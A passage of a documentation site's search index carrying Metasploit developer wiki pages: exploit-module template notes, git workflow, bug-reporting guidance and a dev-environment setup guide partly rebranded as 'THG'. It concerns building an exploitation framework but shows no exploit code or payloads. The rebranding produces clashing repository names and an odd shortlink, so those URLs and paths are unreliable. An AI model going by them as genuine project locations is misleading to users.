The Payloads field specifies how the payload should be encoded and generated. You can specify: Space , SaveRegisters , Prepend , PrependEncoder , BadChars , Append , AppendEncoder , MaxNops , MinNops , Encoder , Nop , EncoderType , EncoderOptions , ExtendedOptions , EncoderDontFallThrough . The DisclosureDate is about when the vulnerability was disclosed in public, in the format of: \"M D Y\". For example: \"Apr 04 2014\" Your exploit should also have a check method to support the check command, but this is optional in case it's not possible. And finally, the exploit method is like your main method. Start writing your code there.","title":"Template"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-exploit/#basic-git-commands","text":"Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We're not here to lecture you about how awesome git is, we know it has a learning curve and it's not surprising to find new users making mistakes. Every once a while, your git \"rage\" will kick in, and we understand. However, it's important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate , which is Metasploit's utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you're submitting other crap you don't intend to change, and/or you're probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that's up to date to master. First off, make sure you're on master. If you do a git status it will tell you what branch you're currently on: $ git status # On branch upstream-master nothing to commit, working directory clean Ok, now do a git pull to download the latest changes from Metasploit: $ git pull Already up-to-date. At this point, you're ready to start a new branch. In this case, we'll name our new branch \"my_awesome_branch\": $ git checkout -b my_awesome_branch Switched to a new branch 'my_awesome_branch' And then you can go ahead and add that module. Make sure it's in the appropriate path: $ git add [module path] When you decide to save the changes, commit (if there's only one module, you can do git commit -a too so you don't have to type the module path. Note -a really means EVERYTHING): $ git commit [module path] When you're done, push your changes, which will upload your code to your remote branch \"my_awesome_branch\". You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch","title":"Basic git commands"},{"location":"dev/thg_dev/How-to-get-started-with-writing-an-exploit/#references","text":"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit.rb","title":"References"},{"location":"dev/thg_dev/Reporting-a-Bug/","text":"Metasploit Bug Reporting As any open source software product grows in popularity, there is a tendency to see an increase in bug report volume coupled with a corresponding decrease in bug report quality. We are not against getting bug reports for Metasploit -- we need bug reports in order to know what's broken. So, rather than trying to stem the tide of bugs, this page will attempt to make sure that each bug report we get is written in a way that maximizes its chances of actually getting resolved. By this point, the Metasploit development community has read thousands of bug reports, and it turns out, well-written bug reports tend to make fixing those bugs much faster and easier. It's really pretty remarkable that a speedy time-to-close seems to corellate so strongly with bug report quality and not the complexity of the bug itself. That said, there are two situations where you generally oughtn't open a bug at all, and that's when you have a support contract, or when you've found a security issue with Metasploit itself. Support Contracts If you have a support contract for a Metasploit product, you ought to get in touch with your Rapid7 support representative, or write to support@rapid7.com . The people who work Metasploit support full time are really pretty with-it are likely to have a fix or a workaround for you on the spot. Security Issues If you have a security issue with Metasploit itself, then we'd really appreciate it if you let us know at security@metasploit.com . After all, we'd like to be treated as we treat other software projects . It's not because we'd like to bury your bug -- we'd just like to have a shot at fixing your bug before someone starts messing with our innocent users. We're happy to give you credit, keep you anonymous, inform you about progress, and explore related issues with you -- but if we see someone reporting security bugs out in public, then it gets a lot harder to keep all that attribution and communication straight as we try not to break our necks implementing a fix as fast as we can. Also, if you could report your security bug in the form of a Metasploit module sent to security@metasploit.com , that would be both ideal and hilarious. That should cover the cases where you shouldn't open a bug at all, so let's move on to our main issue tracking system, Redmine. Introducing Redmine The final destination for bug reports in Metasploit is our Redmine issue tracker . This is where all issues that we want to track are born, grow old, and eventually die. In order to file bug reports, you must first create an account . It's easy and fun. Sadly, we can't take truly anonymous bug reports at this time due to spambots, but we are actively exploring ways to make this registration as painless and easy for humans as we can. In conversation about Metasploit and someone asks, \"is there a bug?\" or refers to \"the bug tracker\" or \"Redmine,\" we're nearly always talking about this system. They're all Bugs Speaking of conversation, it's important to note that we will tend to refer to all issues as \"bugs,\" regardless if it's actually a defect, a feature request, a or a support request. It's just fewer syllables and characters, and is not meant to disparage the content of the issue. GitHub Issues We have an Issue Tracker enabled on the GitHub repo, but, as mentioned above, bugs should hit Redmine if they're going to be tracked. We had a fantasy of closing down Redmine for a while there and switching over to GitHub Issues completely, but Redmine is still just too useful to abandon. So, in the interim, nobody is going to stop you from filing GitHub issues. Many GitHub projects have an \"Issues\" button, and we'd rather not surprise people and make them dig through the wiki to figure out how to report bugs. If you're reading this, you're now enlightened, so should avoid that Issues tab. E-mail We maintain a couple mailing lists -- the Metasploit Framework and the Metasploit-Hackers lists. Sometimes people will run into problems and they'll mention them there. Sometimes, someone will put together bug reports based on traffic on these lists, but sometimes nobody will. The point is, if you're not sure if you have a bug or just a question on usage, start off with an e-mail to the Framework list. If you're pretty sure you have a bug, it's probably best to start off with a regular ol' bug report, and maybe mention it afterwards on one of these lists. Rapid7 Community Rapid7 runs a Metasploit user community over at (wait for it) community.rapid7.com . Like e-mail, this is mostly a venue for discussion and help with using Metasploit, and not so much for bug reporting. Getting Started Enough talk, on to the mechanics of bug reporting! Avoiding Duplicates You may not be the first person to notice the problem you're running into, so here are some strategies for ensuring that a previously reported bug gets attention. If you're having a problem with a particular module, you might try searching that module's name to see if there's anything already reported. If your bug has a particular error message, look for that . Another tactic is to simply glance at the most recent bugs, especially if you suspect this a new bug in a process you're sure used to work before. If you happen to find the bug you're experiencing, updating that report with any new information is hugely helpful in coming to a resolution. You might also find resolved bugs that describe your problem, which indicates a regression (old bugs reintroduced) -- the fixes for those are usually fast, so noting likely regressions is quite useful. Finally, you might find a bug that's been rejected or closed. In these cases, the problem is usually something external to Metasploit -- user error, configuration weirdness, known incompatibilities, etc. If you think that the original resolution was in error, though, open a new bug and point out what you think the problem is. After all, if people keep running into the same non-bug, then it's probably at least a documentation bug, and maybe something real. Describing your bug Make your bug searchable Since we talk a lot about the importance of finding dupes before submitting, make sure that your bug is findable. Use specific module names and error messages in the title, and include as much of the error as you can in the report. \"The Windows login aux mod is broken\" is a terrible title, while \"NoMethodError raised on smb_login module\" is much better. Most of the time, bugs you run into don't have nice, clean error messages. In these cases, try to pin down what you can in the title. For example, see Bug #7215 -- this is a pretty typical complaint that some module is failing to open a shell, but notice that while the module name isn't in the title, it is in the opening description. Also, this bug has tons of logs and screen captures. Logs and screen captures Check out Bug #6905 . If all our bug reports looked like this, I'd be delighted. It's pretty short, and has the all basics -- a short but descriptive title, a full backtrace of the error, a complete history of how he got there, and version information. This bug is very search-friendly, as well as easy to reproduce. If you're testing a module in a lab or virtual environment, we'd love to get as much data about the target as you can provide. This means exact versions of the target including patch levels, pcaps if you can capture them, and any kind of logging inside or outside of Framework. Often, we'll ask for the framework.log -- that's usually kept in $HOME/.msf4/framework.log . On the other hand, if you run into an issue on an engagement, we understand that you can't include a bunch of client data in your bug report. In those cases, we will still bug you for logs, but you'll need to santize them first, and we won't have our feelings hurt if you need to refuse. Such is the business of penetration testing. Mention Your Environment It may be that the bug you're describing only comes up in your environment. If you're not on the normal Metasploit Development Environment or the Metasploit Installation you will want to mention this specifically in your bug report. The output of the commands ruby -v , and uname -a (or winver ) is usually very helpful. Include steps to reproduce At a minimum, the steps you took to get to your predictament are probably found in $HOME/.msf4/history , so you can cut and paste from there. If there's more background than what's contained in the command history, like funny network configurations that might be in play, then mention that, too. We love resource scripts (rc scripts) that can be used to reliably trigger your bug. Those scripts can eventually find their way into repeatable test cases, so if you can put one together, great! For more on resource script writing, see this blog post . Patches Providing Patches Maybe you've run into a bug, and you already know how to fix it. Or, you're just a kind stranger on the Internet who wants to help out. The most reliable way to get your patches into Metasploit is to patch your own fork, and sling a pull request our way. Since you're attacking a bug that already exists, you can use a special commit message string of either [SeeRM #1234] or [FixRM #1234] and that will update Redmine with a pointer to your commit automatically, once the fix is landed. Since it's human-readable, we can tell immediately that you're talking about a Redmine issue, as well, so you or someone can update Redmine with a link to your pull requestr. Of course, this all presumes you're hooked into GitHub. If this doesn't work for you, you can attach patches to a Redmine issue by simply creating a patch diff against a recent checkout of Metasploit -- this is going to be the case for most SVN users (and in that case, you'll want to use svn diff ). Now, be forewarned: patches submitted directly to Redmine are more cumbersome to work with, especially if there are more questions. If you plan on patching more than once or twice, it would behoove you to take a little time to set up your Metasploit Development Environment and start playing along at home. Providing Test Cases We like -- no, love -- to have tests that show that a patch actually works. Again, Resource Scripts are a great way to get something quick put together, and you can combine this with the standard utility screen for some excellent resolutions: Fire up screen and hit Ctrl-a H (mind the caps) msfconsole -L -q -r /path/to/your/test.rc Exit msfconsole and git checkout branch-containing-fix msfconsole -L -q -r /path/to/your/test.rc exit to leave screen This will generate a screen log of your fix that includes all your output and all your keystrokes. Yes, it'll look horrible in a regular text editor due to the various escape codes, but cat and less are both more than adequate to resolve those. If you're on Windows, the msfconsole spool command should provide enough output to at least demo the problem and its solution. Following bugs So, you go to all the effort of filing a bug, and you want to make sure it gets resolved. What next? Notification settings If you opened a bug on Redmine, you should automatically be getting updates to it via e-mail, and the same goes for GitHub pull requests. If you're not for some reason, you should check your own spam filters as well as your Notification Settings . If you want to follow some bug you're not already involved in, you can always tick the \"Watch\" star ath the top right of any issue, and you'll start getting updates every time it changes. TODO: Hook up Redmine updates to Metasploit-Notifications which is already watching GitHub. It'll take ten minutes. Bug discussion Some projects are persnickety about talking about bugs in the bug itself. We're not. If you have a comment or question, ask about it in the bug. We far prefer this public communication over private communication because it makes things easily searchable, captures all the information regarding an issue, and can help future bug-squashers who are searching for similar issues. GitHub pull requests also are known to get chatty. If a bug already has a pull request associated with it, there's a very good chance there's discussion happening over there. Finally, there are often quick conversations about current events going on on Metasploit's Freenode IRC channel, #metasploit. Somewhat surprisingly, the Metasploit Framework and the Metasploit-Hackers mailing lists don't get a lot of action in terms of issue discussion. Maybe that will change, especially if there's a move to get fascist about what kind of comments are appropriate for Redmine issues and pull requests. Resolving Bugs Your bug should be considered \"Resolved\" once there's a fix landed in the Metasploit-Framework master branch . People who track that branch, of course, will have the fix instantly available. A few minutes after that, everyone who relies on msfupdate over SVN will have access to the fix. These are the bleeding-edge branches. Once a week, usually Wednesdays, we release an update to the Metasploit Installation . Generally speaking, Metasploit framework fixes will hit that installation on a weekly basis after appropriate QA. So, while we may refer to a bug as \"resolved,\" it may not be available quite yet. EOF That's it, for now. This document will surely change and evolve as the Metasploit community does.","title":"reporting_a_bug"},{"location":"dev/thg_dev/Reporting-a-Bug/#metasploit-bug-reporting","text":"As any open source software product grows in popularity, there is a tendency to see an increase in bug report volume coupled with a corresponding decrease in bug report quality. We are not against getting bug reports for Metasploit -- we need bug reports in order to know what's broken. So, rather than trying to stem the tide of bugs, this page will attempt to make sure that each bug report we get is written in a way that maximizes its chances of actually getting resolved. By this point, the Metasploit development community has read thousands of bug reports, and it turns out, well-written bug reports tend to make fixing those bugs much faster and easier. It's really pretty remarkable that a speedy time-to-close seems to corellate so strongly with bug report quality and not the complexity of the bug itself. That said, there are two situations where you generally oughtn't open a bug at all, and that's when you have a support contract, or when you've found a security issue with Metasploit itself.","title":"Metasploit Bug Reporting"},{"location":"dev/thg_dev/Reporting-a-Bug/#support-contracts","text":"If you have a support contract for a Metasploit product, you ought to get in touch with your Rapid7 support representative, or write to support@rapid7.com . The people who work Metasploit support full time are really pretty with-it are likely to have a fix or a workaround for you on the spot.","title":"Support Contracts"},{"location":"dev/thg_dev/Reporting-a-Bug/#security-issues","text":"If you have a security issue with Metasploit itself, then we'd really appreciate it if you let us know at security@metasploit.com . After all, we'd like to be treated as we treat other software projects . It's not because we'd like to bury your bug -- we'd just like to have a shot at fixing your bug before someone starts messing with our innocent users. We're happy to give you credit, keep you anonymous, inform you about progress, and explore related issues with you -- but if we see someone reporting security bugs out in public, then it gets a lot harder to keep all that attribution and communication straight as we try not to break our necks implementing a fix as fast as we can. Also, if you could report your security bug in the form of a Metasploit module sent to security@metasploit.com , that would be both ideal and hilarious. That should cover the cases where you shouldn't open a bug at all, so let's move on to our main issue tracking system, Redmine.","title":"Security Issues"},{"location":"dev/thg_dev/Reporting-a-Bug/#introducing-redmine","text":"The final destination for bug reports in Metasploit is our Redmine issue tracker . This is where all issues that we want to track are born, grow old, and eventually die. In order to file bug reports, you must first create an account . It's easy and fun. Sadly, we can't take truly anonymous bug reports at this time due to spambots, but we are actively exploring ways to make this registration as painless and easy for humans as we can. In conversation about Metasploit and someone asks, \"is there a bug?\" or refers to \"the bug tracker\" or \"Redmine,\" we're nearly always talking about this system.","title":"Introducing Redmine"},{"location":"dev/thg_dev/Reporting-a-Bug/#theyre-all-bugs","text":"Speaking of conversation, it's important to note that we will tend to refer to all issues as \"bugs,\" regardless if it's actually a defect, a feature request, a or a support request. It's just fewer syllables and characters, and is not meant to disparage the content of the issue.","title":"They're all Bugs"},{"location":"dev/thg_dev/Reporting-a-Bug/#github-issues","text":"We have an Issue Tracker enabled on the GitHub repo, but, as mentioned above, bugs should hit Redmine if they're going to be tracked. We had a fantasy of closing down Redmine for a while there and switching over to GitHub Issues completely, but Redmine is still just too useful to abandon. So, in the interim, nobody is going to stop you from filing GitHub issues. Many GitHub projects have an \"Issues\" button, and we'd rather not surprise people and make them dig through the wiki to figure out how to report bugs. If you're reading this, you're now enlightened, so should avoid that Issues tab.","title":"GitHub Issues"},{"location":"dev/thg_dev/Reporting-a-Bug/#e-mail","text":"We maintain a couple mailing lists -- the Metasploit Framework and the Metasploit-Hackers lists. Sometimes people will run into problems and they'll mention them there. Sometimes, someone will put together bug reports based on traffic on these lists, but sometimes nobody will. The point is, if you're not sure if you have a bug or just a question on usage, start off with an e-mail to the Framework list. If you're pretty sure you have a bug, it's probably best to start off with a regular ol' bug report, and maybe mention it afterwards on one of these lists.","title":"E-mail"},{"location":"dev/thg_dev/Reporting-a-Bug/#rapid7-community","text":"Rapid7 runs a Metasploit user community over at (wait for it) community.rapid7.com . Like e-mail, this is mostly a venue for discussion and help with using Metasploit, and not so much for bug reporting.","title":"Rapid7 Community"},{"location":"dev/thg_dev/Reporting-a-Bug/#getting-started","text":"Enough talk, on to the mechanics of bug reporting!","title":"Getting Started"},{"location":"dev/thg_dev/Reporting-a-Bug/#avoiding-duplicates","text":"You may not be the first person to notice the problem you're running into, so here are some strategies for ensuring that a previously reported bug gets attention. If you're having a problem with a particular module, you might try searching that module's name to see if there's anything already reported. If your bug has a particular error message, look for that . Another tactic is to simply glance at the most recent bugs, especially if you suspect this a new bug in a process you're sure used to work before. If you happen to find the bug you're experiencing, updating that report with any new information is hugely helpful in coming to a resolution. You might also find resolved bugs that describe your problem, which indicates a regression (old bugs reintroduced) -- the fixes for those are usually fast, so noting likely regressions is quite useful. Finally, you might find a bug that's been rejected or closed. In these cases, the problem is usually something external to Metasploit -- user error, configuration weirdness, known incompatibilities, etc. If you think that the original resolution was in error, though, open a new bug and point out what you think the problem is. After all, if people keep running into the same non-bug, then it's probably at least a documentation bug, and maybe something real.","title":"Avoiding Duplicates"},{"location":"dev/thg_dev/Reporting-a-Bug/#describing-your-bug","text":"","title":"Describing your bug"},{"location":"dev/thg_dev/Reporting-a-Bug/#make-your-bug-searchable","text":"Since we talk a lot about the importance of finding dupes before submitting, make sure that your bug is findable. Use specific module names and error messages in the title, and include as much of the error as you can in the report. \"The Windows login aux mod is broken\" is a terrible title, while \"NoMethodError raised on smb_login module\" is much better. Most of the time, bugs you run into don't have nice, clean error messages. In these cases, try to pin down what you can in the title. For example, see Bug #7215 -- this is a pretty typical complaint that some module is failing to open a shell, but notice that while the module name isn't in the title, it is in the opening description. Also, this bug has tons of logs and screen captures.","title":"Make your bug searchable"},{"location":"dev/thg_dev/Reporting-a-Bug/#logs-and-screen-captures","text":"Check out Bug #6905 . If all our bug reports looked like this, I'd be delighted. It's pretty short, and has the all basics -- a short but descriptive title, a full backtrace of the error, a complete history of how he got there, and version information. This bug is very search-friendly, as well as easy to reproduce. If you're testing a module in a lab or virtual environment, we'd love to get as much data about the target as you can provide. This means exact versions of the target including patch levels, pcaps if you can capture them, and any kind of logging inside or outside of Framework. Often, we'll ask for the framework.log -- that's usually kept in $HOME/.msf4/framework.log . On the other hand, if you run into an issue on an engagement, we understand that you can't include a bunch of client data in your bug report. In those cases, we will still bug you for logs, but you'll need to santize them first, and we won't have our feelings hurt if you need to refuse. Such is the business of penetration testing.","title":"Logs and screen captures"},{"location":"dev/thg_dev/Reporting-a-Bug/#mention-your-environment","text":"It may be that the bug you're describing only comes up in your environment. If you're not on the normal Metasploit Development Environment or the Metasploit Installation you will want to mention this specifically in your bug report. The output of the commands ruby -v , and uname -a (or winver ) is usually very helpful.","title":"Mention Your Environment"},{"location":"dev/thg_dev/Reporting-a-Bug/#include-steps-to-reproduce","text":"At a minimum, the steps you took to get to your predictament are probably found in $HOME/.msf4/history , so you can cut and paste from there. If there's more background than what's contained in the command history, like funny network configurations that might be in play, then mention that, too. We love resource scripts (rc scripts) that can be used to reliably trigger your bug. Those scripts can eventually find their way into repeatable test cases, so if you can put one together, great! For more on resource script writing, see this blog post .","title":"Include steps to reproduce"},{"location":"dev/thg_dev/Reporting-a-Bug/#patches","text":"","title":"Patches"},{"location":"dev/thg_dev/Reporting-a-Bug/#providing-patches","text":"Maybe you've run into a bug, and you already know how to fix it. Or, you're just a kind stranger on the Internet who wants to help out. The most reliable way to get your patches into Metasploit is to patch your own fork, and sling a pull request our way. Since you're attacking a bug that already exists, you can use a special commit message string of either [SeeRM #1234] or [FixRM #1234] and that will update Redmine with a pointer to your commit automatically, once the fix is landed. Since it's human-readable, we can tell immediately that you're talking about a Redmine issue, as well, so you or someone can update Redmine with a link to your pull requestr. Of course, this all presumes you're hooked into GitHub. If this doesn't work for you, you can attach patches to a Redmine issue by simply creating a patch diff against a recent checkout of Metasploit -- this is going to be the case for most SVN users (and in that case, you'll want to use svn diff ). Now, be forewarned: patches submitted directly to Redmine are more cumbersome to work with, especially if there are more questions. If you plan on patching more than once or twice, it would behoove you to take a little time to set up your Metasploit Development Environment and start playing along at home.","title":"Providing Patches"},{"location":"dev/thg_dev/Reporting-a-Bug/#providing-test-cases","text":"We like -- no, love -- to have tests that show that a patch actually works. Again, Resource Scripts are a great way to get something quick put together, and you can combine this with the standard utility screen for some excellent resolutions: Fire up screen and hit Ctrl-a H (mind the caps) msfconsole -L -q -r /path/to/your/test.rc Exit msfconsole and git checkout branch-containing-fix msfconsole -L -q -r /path/to/your/test.rc exit to leave screen This will generate a screen log of your fix that includes all your output and all your keystrokes. Yes, it'll look horrible in a regular text editor due to the various escape codes, but cat and less are both more than adequate to resolve those. If you're on Windows, the msfconsole spool command should provide enough output to at least demo the problem and its solution.","title":"Providing Test Cases"},{"location":"dev/thg_dev/Reporting-a-Bug/#following-bugs","text":"So, you go to all the effort of filing a bug, and you want to make sure it gets resolved. What next?","title":"Following bugs"},{"location":"dev/thg_dev/Reporting-a-Bug/#notification-settings","text":"If you opened a bug on Redmine, you should automatically be getting updates to it via e-mail, and the same goes for GitHub pull requests. If you're not for some reason, you should check your own spam filters as well as your Notification Settings . If you want to follow some bug you're not already involved in, you can always tick the \"Watch\" star ath the top right of any issue, and you'll start getting updates every time it changes. TODO: Hook up Redmine updates to Metasploit-Notifications which is already watching GitHub. It'll take ten minutes.","title":"Notification settings"},{"location":"dev/thg_dev/Reporting-a-Bug/#bug-discussion","text":"Some projects are persnickety about talking about bugs in the bug itself. We're not. If you have a comment or question, ask about it in the bug. We far prefer this public communication over private communication because it makes things easily searchable, captures all the information regarding an issue, and can help future bug-squashers who are searching for similar issues. GitHub pull requests also are known to get chatty. If a bug already has a pull request associated with it, there's a very good chance there's discussion happening over there. Finally, there are often quick conversations about current events going on on Metasploit's Freenode IRC channel, #metasploit. Somewhat surprisingly, the Metasploit Framework and the Metasploit-Hackers mailing lists don't get a lot of action in terms of issue discussion. Maybe that will change, especially if there's a move to get fascist about what kind of comments are appropriate for Redmine issues and pull requests.","title":"Bug discussion"},{"location":"dev/thg_dev/Reporting-a-Bug/#resolving-bugs","text":"Your bug should be considered \"Resolved\" once there's a fix landed in the Metasploit-Framework master branch . People who track that branch, of course, will have the fix instantly available. A few minutes after that, everyone who relies on msfupdate over SVN will have access to the fix. These are the bleeding-edge branches. Once a week, usually Wednesdays, we release an update to the Metasploit Installation . Generally speaking, Metasploit framework fixes will hit that installation on a weekly basis after appropriate QA. So, while we may refer to a bug as \"resolved,\" it may not be available quite yet.","title":"Resolving Bugs"},{"location":"dev/thg_dev/Reporting-a-Bug/#eof","text":"That's it, for now. This document will surely change and evolve as the Metasploit community does.","title":"EOF"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/","text":"The shortlink to this wiki page is https://darkcode0x00/THG_DEV_main This is a guide for setting up a developer environment to contribute modules, documentation, and fixes to the THG Framework. If you just want to use THG for legal, authorized hacking, we recommend instead you: Install the open-source Omnibus installer , or Use the pre-installed THG on Kali Linux or Parrot Linux . If you want to contribute to THG, start by reading our CONTRIBUTING.md , then follow the rest of this guide. Assumptions You have installed an apt-based Linux environment, such as Ubuntu or Kali . You have created a GitHub account and associated an ssh key with it. You have familiarity with Git and Github, or have completed the Github bootcamp . For optional database and REST API functionality, you will need regular user account that is not root . Install dependencies Open a terminal on your Linux host and set up Git, build tools, and Ruby dependencies: sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev Set up your local copy of the repository You will need to use Github to create a fork for your contributions and receive the latest updates from our repository. Login to Github and click the \"Fork\" button in the top-right corner of the THG-framework repository. Create a git directory in your home folder and clone your fork to your local machine: export GITHUB_USERNAME = YOUR_USERNAME_FOR_GITHUB export GITHUB_EMAIL = YOUR_EMAIL_ADDRESS_FOR_GITHUB mkdir -p ~/git cd ~/git git clone git@github.com: $GITHUB_USERNAME /THG-framework cd ~/git/THG-framework If you encounter a \"permission denied\" error on the above command, research the error message. If there isn't an explicit reason given, confirm that your Github SSH key is configured correctly . To receive updates, you will create an upstream-master branch to track the Rapid7 remote repository, alongside your master branch which will point to your personal repository's fork: git remote add upstream git@github.com:rapid7/THG-framework.git git fetch upstream git checkout -b upstream-master --track upstream/master Configure your Github username, email address, and username. Ensure your user.email matches the email address you registered with your Github account. git config --global user.name \" $GITHUB_USERNAME \" git config --global user.email \" $GITHUB_EMAIL \" git config --global github.user \" $GITHUB_USERNAME \" Set up THGtidy to run before each git commit and after each git merge to quickly identify potential issues with your contributions: cd ~/git/THG-framework ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/pre-commit ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/post-merge Install Ruby Linux distributions do not ship with the latest Ruby, nor are package managers routinely updated. Additionally, if you are working with multiple Ruby projects, each one has dependencies and Ruby versions which can start to conflict. For these reasons, it is advisable to use a Ruby manager. You could just install Ruby directly (eg. sudo apt install ruby-dev ), but you may likely end up with the incorrect version and no way to update. Instead, consider using one of the many different Ruby environment managers available. The THG team prefers rbenv and rvm . Regardless of your choice, you'll want to make sure that, when inside the ~/git/THG-framework directory, you are running the correct version of Ruby: $ cd ~/git/THG-framework $ cat .ruby-version 2.5.3 $ ruby -v ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux-gnu] Note: the Ruby version is likely to change over time, so don't rely on the output in the above example. Instead, confirm your ruby -v output with the version number listed in the .ruby-version file. If the two versions don't match, restart your terminal. If that does not work, consult the troubleshooting documentation for your Ruby environment manager. Unfortunately, troubleshooting the Ruby environment is beyond the scope of this document, but feel free to reach out for community support using the links at the bottom of this document. Install Gems Before you run THG, you will need to update the gems (Ruby libraries) that THG depends on: cd ~/git/THG-framework/ gem install bundler bundle install If you encounter an error with the above command, refer to the bundle output and search for the error message along with the name of the gem that failed. Likely, you'll need to apt get install a dependency that is required by that particular gem. If it was something else, open a new issue to let us know what happened. Congratulations! You have now set up a development environment and the latest version of THG. Optional: Set up the REST API and PostgreSQL database The following optional section describes how to manually install PostgreSQL and set up the THG database. Alternatively, use our Omnibus installer which handles this more reliably. Click to expand. 1. Confirm that the PostgreSQL server and client are installed: sudo apt update && sudo apt-get install -y postgresql postgresql-client sudo service postgresql start && sudo update-rc.d postgresql enable 2. Ensure that you are not running as the root user. 3. Initialize the THG database: cd ~/git/THG-framework ./THGdb init 4. If you receive an error about a component not being installed, confirm that the binaries shown are in your path using the [which] and [find] commands, then modifying your [$PATH] environment variable. If it was something else, open a [new issue] to let us know what happened. 5. If the `THGdb init` command succeeds, then confirm that the database is accessible to THG: $ ./THGconsole -qx \"db_status; exit\" Congratulations! You have now set up the [THG Web Service (REST API)][THG-web-service] and the backend database. Optional: Tips to speed up common workflows The following section is optional but may improve your efficiency. Click to expand. - Making sure you're in the right directory to run `THGconsole` can become tedious, so consider using the following Bash alias: echo 'alias THGconsole=\"pushd $HOME/git/THG-framework && ./THGconsole && popd\"' >> ~/.bash_aliases - Consider generating a GPG key to sign your commits. Read about [why][git-horror] and [how][signing-howto]. - Developers tend to customize their own [git aliases] to speed up common commands, but here are a few common ones: [alias] # An easy, colored oneline log format that shows signed/unsigned status nicelog = log --pretty=format:'%Cred%h%Creset -%Creset %s %Cgreen(%cr) %C(bold blue)<%aE>%Creset [%G?]' # Shorthand commands to always sign (-S) and always edit the commit message. m = merge -S --no-ff --edit c = commit -S --edit # Shorthand to always blame (praise) without looking at whitespace changes b= blame -w - If you plan on working with other contributor's pull requests, you may run the following script which makes it easier to do so: tools/dev/add_pr_fetch.rb After running the above script, you can `checkout` other pull requests more easily: git fetch upstream git checkout fixes-to-pr-12345 upstream/pr/12345 - If you're writing test cases (which you should), then make sure [rspec] works: rake spec You should see over 9000 tests run, mostly resulting in green dots, a few in yellow stars, and no red errors. Great! Now what? We're excited to see your upcoming contributions of new modules, documentation, and fixes! Check out our wiki documentation and, if you're looking for inspiration, keep an eye out for newbie-friendly pull requests and issues . Please submit your new pull requests and reach out to us on Slack for community help. Finally, we welcome your feedback on this guide, so feel free to reach out to us on Slack or open a new issue . For their significant contributions to this guide, we would like to thank @kernelsmith , @corelanc0d3r , and @ffmike .","title":"Setting Up a THG Development Environment"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#assumptions","text":"You have installed an apt-based Linux environment, such as Ubuntu or Kali . You have created a GitHub account and associated an ssh key with it. You have familiarity with Git and Github, or have completed the Github bootcamp . For optional database and REST API functionality, you will need regular user account that is not root .","title":"Assumptions"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#install-dependencies","text":"Open a terminal on your Linux host and set up Git, build tools, and Ruby dependencies: sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev","title":"Install dependencies"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#set-up-your-local-copy-of-the-repository","text":"You will need to use Github to create a fork for your contributions and receive the latest updates from our repository. Login to Github and click the \"Fork\" button in the top-right corner of the THG-framework repository. Create a git directory in your home folder and clone your fork to your local machine: export GITHUB_USERNAME = YOUR_USERNAME_FOR_GITHUB export GITHUB_EMAIL = YOUR_EMAIL_ADDRESS_FOR_GITHUB mkdir -p ~/git cd ~/git git clone git@github.com: $GITHUB_USERNAME /THG-framework cd ~/git/THG-framework If you encounter a \"permission denied\" error on the above command, research the error message. If there isn't an explicit reason given, confirm that your Github SSH key is configured correctly . To receive updates, you will create an upstream-master branch to track the Rapid7 remote repository, alongside your master branch which will point to your personal repository's fork: git remote add upstream git@github.com:rapid7/THG-framework.git git fetch upstream git checkout -b upstream-master --track upstream/master Configure your Github username, email address, and username. Ensure your user.email matches the email address you registered with your Github account. git config --global user.name \" $GITHUB_USERNAME \" git config --global user.email \" $GITHUB_EMAIL \" git config --global github.user \" $GITHUB_USERNAME \" Set up THGtidy to run before each git commit and after each git merge to quickly identify potential issues with your contributions: cd ~/git/THG-framework ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/pre-commit ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/post-merge","title":"Set up your local copy of the repository"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#install-ruby","text":"Linux distributions do not ship with the latest Ruby, nor are package managers routinely updated. Additionally, if you are working with multiple Ruby projects, each one has dependencies and Ruby versions which can start to conflict. For these reasons, it is advisable to use a Ruby manager. You could just install Ruby directly (eg. sudo apt install ruby-dev ), but you may likely end up with the incorrect version and no way to update. Instead, consider using one of the many different Ruby environment managers available. The THG team prefers rbenv and rvm . Regardless of your choice, you'll want to make sure that, when inside the ~/git/THG-framework directory, you are running the correct version of Ruby: $ cd ~/git/THG-framework $ cat .ruby-version 2.5.3 $ ruby -v ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux-gnu] Note: the Ruby version is likely to change over time, so don't rely on the output in the above example. Instead, confirm your ruby -v output with the version number listed in the .ruby-version file. If the two versions don't match, restart your terminal. If that does not work, consult the troubleshooting documentation for your Ruby environment manager. Unfortunately, troubleshooting the Ruby environment is beyond the scope of this document, but feel free to reach out for community support using the links at the bottom of this document.","title":"Install Ruby"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#install-gems","text":"Before you run THG, you will need to update the gems (Ruby libraries) that THG depends on: cd ~/git/THG-framework/ gem install bundler bundle install If you encounter an error with the above command, refer to the bundle output and search for the error message along with the name of the gem that failed. Likely, you'll need to apt get install a dependency that is required by that particular gem. If it was something else, open a new issue to let us know what happened. Congratulations! You have now set up a development environment and the latest version of THG.","title":"Install Gems"},{"location":"dev/thg_dev/Setting_Up_a_THG_Development_Environment/#optional-set-up-the-rest-api-and-postgresql-database","text":"The following optional section describes how to manually install PostgreSQL and set up the THG database. Alternatively, use our Omnibus installer which handles this more reliably. Click to expand. 1. 